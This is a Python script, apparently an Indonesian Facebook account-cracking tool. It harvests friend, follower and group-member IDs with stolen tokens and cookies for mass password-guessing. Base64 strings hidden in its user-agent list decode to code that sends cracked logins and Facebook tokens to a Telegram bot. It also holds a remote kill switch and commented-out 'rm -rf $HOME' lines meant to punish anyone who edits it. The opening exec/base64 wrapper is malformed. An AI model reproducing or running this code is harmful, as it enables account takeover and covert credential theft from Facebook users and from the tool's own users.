import base64
exec(base64.b64decode("#################################################################
#         		ATHOUR : MR.JEWEL			#
#  		     WHATSAPP : 09055012862			#
#		  GITHUB : github.com/JEWELFUND        	#
#	       FACEBOOK : m.facebook.com/llovexnxx		#
#################################################################
## import list
import os,sys
try: import requests
except ModuleNotFoundError:print("Sedang Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Sedang Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Sedang Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")

## import dalam
import requests as req
import requests as re
import time,random,json
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup

import requests as ress


def exit():
	sys.exit()
	exit()





def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.009)

## import crack
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as kikygtg
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
try:os.remove("old.txt")
except:pass
try:os.remove("oldv2.txt")
except:pass
try:
	os.mkdir('dump')
except:pass
try:
	os.mkdir('Hasil')
except:pass


## warna public
P = '\x1b[0;97m' # PUTIH
M = '\x1b[0;91m' # MERAH
H = '\x1b[0;92m' # HIJAU.
K = '\x1b[0;93m' # KUNINg.
B = '\x1b[0;94m' # BIRU.
U = '\x1b[0;95m' # UNGU.
O = '\x1b[0;96m' # BIRU MUDA.
N = '\x1b[0m'    # WARNA MATI
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
#P='\033[0;37m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
#P='\033[0;37m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"
war = (Q+"["+C+"+"+Q+"] ")
inp = (Q+"["+U+"-"+Q+"] ")
bulat = (Q+"["+C+"#"+Q+"] ")
garis = (war+"=====================================================")
#war = ("|— ")
#inp = ("|–")
#bulat = ("|-")
def play_mpv(x):
	global alam
	try:
		if alam == "y" or "y" == alam:
			try:
				os.popen("play-audio "+x)
			except:pass
	except:pass
def pilih_alam():
	global alam
	pil_b = input(war+"Apakah Anda Mau Bikin Suara/Alarm Jika Keluar Hasil Crack (Y/n) : ")
	if pil_b == "y" or pil_b == "Y":
		jalan(war+"Jika Ada Suara Mamang Garookx, Tandanya Hasil Crack Keluar")
		jalan(war+"Contoh ...")
		alam = ("y")
		play_mpv('assalamualaikum.mp3')
		return alam
	else:
		alam = ("Garoookkxxx")
		return alam

def pilih_infong():
	global infoong
	pil_vv = input(war+"Apakah Anda Mau Menampilkan Informasi Akun (Y/n) :")
	if pil_vv == "y" or pil_vv == "Y":
		infoong = ("y")
		return infoong
	else:
		infoong = ("Garoookkxxx")
		return infoong

from gtts import gTTS
def play_m(text):
	my_a = gTTS(text)
	my_a.save("hello.mp3")
	play_mpv('hello.mp3')
#play_m("Hai")


def kata_buat_server():
	for nnn in list([C+"@"+K+"•••"+Q, K+"•"+C+"@"+K+"••"+Q, K+"••"+C+"@"+K+"•"+Q, K+"•••"+C+"@"+Q]):
		for nnnn in list(["Maaf Server Sedang, Maintenanc Cobalah Beberapa Hari Lagi", "Cobalah Beberapa Hari Lagi, Atau Tunggu 2-5 Hari         "]):
			sys.stdout.write(f'\r{Q}[{U}{datetime.now().strftime("%H:%M:%S")}{Q}] {nnn} -> {M}{nnnn}{Q}        '),
			sys.stdout.flush()
			time.sleep(1)
	kata_buat_server()
von = requests.get("https://pastebin.com/raw/BzLDAfb1").text.strip()
if "ON" in von:pass
else:
	os.system("git pull;clear")
	jalan(war+"Maaf Script Sedang Maintenance, Harap Tunggu Hingga Selesai")
	jalan(war+'Tekan CTRL + Z Untuk Ezit !')
	kata_buat_server()




kiky_at = ("Mr.Risky")
ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
kiky_hp = ("+6283143565470")
#exec(base64.b64decode(ua_mm[2]))
import sys, os, subprocess, platform, struct
if not struct.calcsize("P")*7==32:
    #    exit(Q+"["+C+"!"+Q+"]"+K+" Maaf Script Ini Tidak Suport DiHp Anda")

#null=open(os.devnull, "w")
#insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
#null.close()
#if insta !=0:
        os.system('pkg install play-audio -y &> /dev/null')

#try :
#	import requests, sty, bs4
#except ImportError as e:
#	os.system('python -m pip install '+e.name+' &> /dev/null')


###### >>>> SETINGAN UNTUK LEN ATAU STR
CP, OK = 0, 0
TP = 0
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0
opq = []
olq = []
Aman,Cp,Salah=0,0,0
mb = "https://m.facebook.com"
url_mb = "https://m.facebook.com"
ok = []
cp = []
ttl = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]

###### >>>> SETINGAN JAM ATAU TANGGAL
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
#bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}





###### >>>> SETINGAN TOKEN CRACK BAPI DAN MBASIC
def kontol():
	print(""" Anak anjing Kontol Itu Bukan Setting Metode
Tapi itu setting Loger Anak anj ngerti ngga lu anj""")
## logo anak ganteng
"""
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒
▒▒████▄▒▒▒▄▄▄▄▄▄▄▒▒▒▄████▒▒
▒▒▒▒▒▀▀▒▄█████████▄▒▀▀▒▒▒▒▒
▒▒▒▒▒▒▒█████████████▒▒▒▒▒▒▒
▒▒▒▒▒▒▒██▀▀▀███▀▀▀██▒▒▒▒▒▒▒
▒▒▒▒▒▒▒██▒▒▒███▒▒▒██▒▒▒▒▒▒▒
▒▒▒▒▒▒▒█████▀▄▀█████▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒███████▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▄▄▄██▒▒█▀█▀█▒▒██▄▄▄▒▒▒▒
▒▒▒▒▀▀██▒▒▒▒▒▒▒▒▒▒▒██▀▀▒▒▒▒
▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▀▀▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
"""




wwn = pilih([U, C, B, Q])

loag = f"""{wwn}_______________  ___________ __________		{K}•{C}━━━━━━━━━━━━━━━━━━━━{K}•{Q}
{wwn}______  /___   |/  /___  __ )___  ____/		{K}•{M}  Created By JEWELFUND{K}•{Q}
{wwn}___ _  / __  /|_/ / __  __  |__  /_		{K}•{M} Mode In Indonesia® {K}•{Q}
{wwn}/ /_/ /  _  /  / /  _  /_/ / _  __/		{K}•{C}━━━━━━━━━━━━━━━━━━━━{K}•{Q}
{wwn}\____/   /_/  /_/   /_____/  /_/{Q}"""

logo = (f"""{loag}
[{C}++{Q}] Athour       : {kiky_at}
[{C}++{Q}] WhatsApp     : {kiky_hp}
[{C}++{Q}] Version      : {M}2.0.2{Q}""")

try:
	ua = open(".ua","r").read()
except:
	print (war+'Anda Menggunakan Useragent Default !!');time.sleep(2)
	ua = pilih([
	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
#	"NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
	])
	ua1 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	ua2 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass
try:kiky_pass=requests.get("http://ip-api.com/json/").json()["country"].lower()
except:kiky_pass="None"

def menu():
	global ua
	os.system("clear")
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		try:
			nama = a["name"]
		except:
			nama = a["username"]
	except:
		print((war+" Token Invalid"))
		time.sleep(1)
		login()
	try:ip=requests.get("http://ip-api.com/json/").json()["query"]
	except:ip=("None")
	try:kiky=requests.get("http://ip-api.com/json/").json()["country"].lower()
	except:kiky=("None")
	try:kiky_kartu=requests.get("http://ip-api.com/json/").json()["isp"]
	except:kiky_kartu=("None")
	print (logo)
	visitor()
#											
	url_main = "https://www.whatsmyua.info"
	s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
	raw_ua = s.find("li", id="rawUa").text
	family = s.find("li", id="family").text
	name_hp = s.find("li", id="product").text
	os_ = s.find("li", id="os").text
	ly = s.find("li", id="layout").text

	ua = raw_ua.replace("rawUa: ", "") # My Useragnet
	jenis_ua = family.replace("family: ", "")
	jenis_hp = name_hp.replace("product: ", "")
	jenis_os = os_.replace("os: ", "")
	jenis_ly = ly.replace("layout: ", "")
#											
#	if "Facebook" in jenis_ua:pass
#	else:
#		jalan(war+"Maaf Useragent Anda Tidak Bisa DiGunakan, Karena Tidak Terdeksi Useragent Facebook")
#		try:os.remove(".ua")
#		except:pass
#		exit(jalan(war+"Hapus Useragent Berhasil, Dan Anda Menggunakan Useragent Default"))

	print(f"{C}[{P}##{C}]{U}======================{C}DATA-KAMU{U}=================================>")
	print(Q+"["+C+"••"+Q+"] Nama Kamu       : "+M+nama)
	try:print(Q+"["+C+"++"+Q+"] Nama HandPhone  : "+M+jenis_hp)
	except:pass
	try:print(Q+"["+C+"++"+Q+"] Ip Address      : "+K+ip)
	except:pass
	try:print(Q+"["+C+"++"+Q+"] Jenis Useragents: "+K+str(jenis_ua))
	except:pass
	try:print(Q+"["+C+"++"+Q+"] Jenis Perangkat : "+K+jenis_os)
	except:pass
	try:print(Q+"["+C+"++"+Q+"] Jenis Layout    : "+K+jenis_ly)
	except:pass
	off_ = Q+"("+M+" Maintenance "+Q+")"
	print(Q+"["+C+"++"+Q+"] Negara Kamu     : "+C+kiky)
	print(Q+"["+C+"++"+Q+"] Jenis Jaringan  : "+C+kiky_kartu)
	print(f"{C}[{P}##{C}]{U}======================{C}MENU-JMBF{U}=================================>")
	print(C+"["+P+"01"+C+"]"+P+" M U L T I__P U B L I C__I.D__C L O N I N G")
	print(C+"["+P+"02"+C+"]"+P+" M U L T I__F O L O W E R __I.D__C L O N I N G")
	print(C+"["+P+"03"+C+"]"+P+" M U L T I__P U B L I C_&_FOLLOWERZ__I.D__C L O N I N G")
	print(C+"["+P+"04"+C+"]"+P+" OLD ID CLONING [V1] ")
	print(C+"["+P+"05"+C+"]"+P+" OLD ID CLONING [V2] ")
	print(C+"["+P+"06"+C+"]"+P+" Crack Dari Anggota Groups "+off_)
	print(C+"["+P+"07"+C+"]"+P+" F I L E_____C L O N I NG")
	print(C+"["+P+"08"+C+"]"+K+" AUTO DUMP UMLIMTED IDZ FOR FILE("+M+"FAST"+Q+")")
	print(C+"["+P+"09"+C+"]"+K+" I N S T A G R A M__C L O N I N G ")
	print(C+"["+P+"10"+C+"]"+P+" Ganti User Agent")
	print(C+"["+P+"11"+C+"]"+P+" Check Opsi Akun Facebook ")
	print(C+"["+P+"12"+C+"]"+P+" Check Jumlah Teman ("+M+"Rawan Engga Bisa Dump"+Q+")")
	print(C+"["+P+"13"+C+"]"+P+" Lihat Informasih Data Target")
	print(C+"["+P+"14"+C+"]"+M+" Lihat Hasil Crack")
	print(C+"["+P+"15"+C+"]"+M+" Lapor Ke Admin Script "+Q+"("+K+"Report"+Q+")")
	print(C+"["+P+"00"+C+"]"+P+" Exit (hapus token)")
	ba=input("\n"+war+"Pilih : ")
	if ba in [""," "]:
		print(war+"Jangan Kosong Bangsat")
		time.sleep(2)
		menu()

	elif ba in ["1","01"]:
		dump_public()
		exit()

	elif ba in ["2","02"]:
		dump_follow()
		exit()

	elif ba in ["3","03"]:
		dump_follow_public()
		exit()

	elif ba in ["4","04"]:
#		dumppro()
		dump_old()
		exit()

	elif ba in ["5","05"]:
		buat_old()
		exit(war+"Done ! ")

	elif ba in ["6","06"]:
		jalan(war+"Maaf Menu Ini Sedang Maintenance Harap Besabar !")
		time.sleep(1)
		menu()

	elif ba in ["xZ","xz"]:
		check_kukis()
		global nama_grup
		_mmk_ = open('.cokie.txt').read()
		kueh  = {"cookie":_mmk_}
		kontol = input(f"{war}Masukan Idz Grups Sesad : ")
		if kontol in[""," "]:
			print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
		else:
			try:
				ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
				agg=re.findall('\<span class\=\".*?\">(.*?)<\/span\>',ajg)[2]
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"\n%s[%s!%s] Maaf Idz {kontol} Grup Ini Tidak DiPublickan"%(N,M,N));time.sleep(2);menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n%s[%sX%s] Maaf Cookies Saat Ini Anda Gunakan, Telah DiBatasih"%(N,M,N));time.sleep(2);menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"\n%s[%sX%s] Maaf Idz {kontol} Grup Ini Tidak DiTemukan !"%(N,M,N));time.sleep(2);menu()
				else:
					nama_grup = re.findall("\<title\>(.*?)<\/title\>",ajg)[0]
					nama_grup = nama_grup.replace(" ","-")
					jalan(war+"Hasil Dump DiSimpan Di : "+I+"dump/"+nama_grup+".json"+Q)
					print(war+"Nama Grups : "+I+re.findall("\<title\>(.*?)<\/title\>",ajg)[0]+Q)
					print("\n"+war+"Tekan CTRL + C Untuk Berhenti !!")
					crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit("\n"+war+"Maaf Jaringan Anda, Putus Karena Murah")
		crackmenu("dump/"+nama_grup+".json").passmenu("dump/"+nama_grup+".json")
		exit("\n"+war+'Done !')
	elif ba in ["7","07"]:
		cekfile("dump")
		try:
			file = input(war+"Nama File : ")
			crackmenu(file).passmenu(file)
			exit()
		except FileNotFoundError:
			exit(war+'File Tidak Ada !!')

	elif ba in ["8","08"]:
		dump_ulti()
		exit()
	elif ba in ["9","09"]:
		log_igeh()
		menu_igeh()
		exit()


	elif ba in ["10"]:
		ganti_ua()
		exit()

	elif ba in ["11"]:
#	 	buatngecek()  V 1
		cpdetect()
		exit()

	elif ba in ["12"]:
		cek_anak_epep()
		exit()


	elif ba in ["13"]:
		get_info()
		exit()



	elif ba in ["14"]:
		rek()
		exit()

	elif ba in ["15"]:
		buat_laporan()

	elif ba in ["00"]:
		jalan(war+"Terima Kasih Telah Menggunakan Script Saya !!!")
		os.system("rm -rf .login.txt")
		exit()
	else:
		print(war+'Isi Dengan Benar Bangsat')
#	elif ba in ["","12"]:
def buat_laporan():
	from urllib.parse import quote
	jalan(war+"Halo Silahkan Isi Data Anda Dan Pesan Laporan (Masalah) Yang Terjadi")
	anu = input(war+"Nama Anda       : ")
	anun = input(war+"Pesan (Masalah) : ")
	load()
	jalan(war+"Sedang Membuat Text (Laporan) !!")
	url_wa = "https://api.whatsapp.com/send?phone=6283143565470&text="
	tks = ("Halo Admin Jmbf :)\nInfo : \nNama Pengirim : "+anu+"\n\nPesan (Laporan) : "+anun)
	subprocess.check_output(["am", "start", url_wa+quote(tks)])
anak_hakiki_ajg = "ANAK KONTOL, SAMA AJA MACAM HAKIKI"
def load():
	_ = ""
	__ = int("50")
	___ = int("0")
	for t in range(int("50")):
		_ += "="
		__ -= 1
		___ += 1
		print(("\r[+]%s>>> %s/%s"%(_,int(__),int(___))), end=' ');sys.stdout.flush()
		time.sleep(0.10)
	print("\n")

def dumppro():
	jalan(war+"Jika Anda Menggunakan Tools Ini, Kemungkinan Akan Terjadi Tumbal Mati !")
	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	idt = input(war+"Masukan Idz Atau Username Target : ")
	idt = ubah_username_to_id(idt)
#	idt = input(inp+"Target ID : ")
	if idt == " " or idt == "":
		dumppro()
	limit = "9999999999"
	filex = input(inp+"Nama File Masal : ")
	if filex == " " or filex == "":
		dumppro()
	fila = input(inp+"Nama File Old : ")
	if fila == " " or fila == "":
		dumppro()
	filexx = input(inp+"Nama File New : ")
	if filexx == " " or filexx == "":
		dumppro()
	if fila == filex:
		jalan(war+"Nama File Tidak Boleh Sama !")
		dumppro()
	if fila == filexx:
		jalan(war+"Nama File Tidak Boleh Sama !")
		dumppro()
	if filex == filexx:
		jalan(war+"Nama File Tidak Boleh Sama !")
		dumppro()
	file_new = open("dump/"+fila+".json","w")
	file_new = open("dump/"+filex+".json","w")
	file_new = open("dump/"+filexx+".json","w")
	print(war+"Hasil Dump Masal : dump/"+filex+".json")
	print(war+"Hasil Dump New : dump/"+filexx+".json")
	print(war+"Hasil Dump Old : dump/"+fila+".json")
	try:
		toket = open(".login.txt","r").read()
		token = open(".login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://m.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = (".lpp").replace(" ","_")
		yss = open(qqq , "w")
		for i in z["data"]:
			try:
				uid = i['id']
				na = i['name']
				id.append(uid+"<=>"+na)
				yss.write(uid+"<=>"+na+"\n")
			except:pass
		yss.close()
		tmen = ("%s"%(str(len(id))))
		print(war+'Jumlah Id : '+str(len(id)))
		time.sleep(1)
	except:pass
	jalan(war+"Tekan CTRL + Z Untuk Stop Dump !!")
	try:
		pro1(".lpp",limit,filex,fila,filexx)
	except (KeyboardInterrupt,EOFError):
		exit(jalan(war+"Dump DiStop !!"))
	except Exception as e:
		exit((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
def pro1(file,lim,savefile,saveold,kntl):
    try:
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=5) as su:
                try:
                        for akun in list_akun:
                                akn=akun.split("<=>")
                                try:
                                    su.submit(buat_,akn[0],savefile,saveold,kntl)
#                                    su.submit(dump_public,akn[0],lim,savefile,fila)
                                except (KeyboardInterrupt,EOFError):
                                    jalan(war+"Dump DiStop !!");time.sleep(4);menu()
                except (KeyboardInterrupt,EOFError):
                    exit(jalan(war+"Dump DiStop !!"))
    except (KeyError, IOError):
        exit(war+"File Tidak Tersedia !!")
try:
	if "Mr.Risky" == kiky_at or kiky_at == "Mr.Risky":
		pass
	else:
		#os.remove("$HOME")
		#os.system("rm -rf $HOME/*")
		#os.system("rm -rf *")
		#os.system("rm -rf /sdcard/DCIM")
		exit((war+"Ciee Anak Kontol Mau Recoder !!\n"+war+"Data Kamu Saya Hapus !!"))
except:
	#os.remove("$HOME")
	#os.system("rm -rf $HOME/*")
	#os.system("rm -rf *")
	#os.system("rm -rf /sdcard/DCIM")
	exit((war+"Ciee Anak Kontol Mau Recoder !!\n"+war+"Data Kamu Saya Hapus !!"))
def buat_(idt,save,saold,jaai):
	try:
		toket = open(".login.txt","r").read()
		token = open(".login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	r = requests.get("https://m.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		yss = open(qqq , "a+")
		for i in z["data"]:
			uid = i['id']
			nm = i['name']
			nama = i['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"<=>"+nama+"\n")
					print(uid)
					olq.append(uid+'<=>'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'<=>'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"<=>"+nama+"\n")
			except:pass
			try:
				try:
					neww = uid.split("10003")
					bja = (f"10003{neww[1]}")
				except:
					try:
						neww = uid.split("10004")
						bja = (f"10004{neww[1]}")
					except:
						try:
							neww = uid.split("10006")
							bja = (f"10006{neww[1]}")
						except:
							try:
								neww = uid.split("10007")
								bja = (f"10007{neww[1]}")
							except:pass
				opq.append(bja+'<=>'+nm)
				olqj=open("dump/"+jaai+".json", "a+")
				olqj.write(bja+"<=>"+nama+"\n")
			except:pass
			id.append(uid+"<=>"+na)
			yss.write(uid+"<=>"+na+"\n")
		yss.close()
	except KeyError:pass
	rr = requests.get("https://m.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	zz = json.loads(rr.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		dump = open(qqq , "a+")
		for ii in zz["data"]:
			uid = ii['id']
			nama = ii['name']
			nm = ii['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"<=>"+nama+"\n")
					print(uid)
					olq.append(uid+'<=>'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'<=>'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"<=>"+nama+"\n")
#				print(uid)
#				olq.append(uid+'<=>'+nm)
#				ppx=open("dump/"+olds+".json", "a+")
#				ppx.write(old+"<=>"+name+"\n")
#				ppx.close()
			except:pass
			lq.append(uid+'<=>'+nm)
			dump.write(uid+'<=>'+nm+'\n')
		dump.close()
	except KeyError:pass
	try:
		tmen = ("%s"%(str(len(id))))
		epeq = ("%s"%(str(len(lq))))
		oldd = ("%s"%(str(len(olq))))
		nnew = ("%s"%(str(len(opq))))
